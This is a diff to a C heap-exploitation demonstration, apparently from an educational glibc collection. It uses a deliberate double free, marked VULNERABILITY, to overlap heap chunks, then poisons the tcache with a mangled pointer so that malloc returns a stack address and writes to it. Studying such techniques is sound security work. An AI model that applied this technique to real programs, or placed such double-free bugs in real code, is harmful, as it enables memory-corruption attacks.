@@ -42,7 +42,7 @@ int main()
     printf("Allocating the victim chunk: a @ %p\n", a);
     puts("Allocating a padding to prevent consolidation.\n");
     malloc(0x10);
-    
+
     // cause chunk overlapping
     puts("Now we are able to cause chunk overlapping");
     puts("Step 1: fill up tcache list");
@@ -51,10 +51,10 @@ int main()
     }
     puts("Step 2: free the victim chunk so it will be added to unsorted bin");
     free(a);
-    
+
     puts("Step 3: free the previous chunk and make it consolidate with the victim chunk.");
     free(prev);
-    
+
     puts("Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n");
     malloc(0x100);
     /*VULNERABILITY*/
@@ -62,14 +62,25 @@ int main()
     /*VULNERABILITY*/
 
     puts("Now we have the chunk overlapping primitive:");
-    int prev_size = prev[-1] & 0xff0;
-    int a_size = a[-1] & 0xff0;
-    printf("prev @ %p, size: %#x, end @ %p\n", prev, prev_size, (void *)prev+prev_size);
-    printf("victim @ %p, size: %#x, end @ %p\n", a, a_size, (void *)a+a_size);
-    a = malloc(0x100);
-    memset(a, 0, 0x100);
-    prev[0x110/sizeof(intptr_t)] = 0x41414141;
-    assert(a[0] == 0x41414141);
+    puts("This primitive will allow directly reading/writing objects, heap metadata, etc.\n");
+    puts("Below will use the chunk overlapping primitive to perform a tcache poisoning attack.");
 
+    puts("Get the overlapping chunk from the unsorted bin.");
+    intptr_t *unsorted = malloc(0x100 + 0x100 + 0x10);
+    puts("Use the overlapping chunk to control victim->next pointer.");
+    // mangle the pointer since glibc 2.32
+    unsorted[0x110/sizeof(intptr_t)] = ((long)a >> 12) ^ (long)stack_var;
+
+    puts("Get back victim chunk from tcache. This will put target to tcache top.");
+    a = malloc(0x100);
+    int a_size = a[-1] & 0xff0;
+    printf("victim @ %p, size: %#x, end @ %p\n", a, a_size, (void *)a+a_size);
+
+    puts("Get the target chunk from tcache.");
+    intptr_t *target = malloc(0x100);
+    target[0] = 0xcafebabe;
+
+    printf("target @ %p == stack_var @ %p\n", target, stack_var);
+    assert(stack_var[0] == 0xcafebabe);
     return 0;
 }
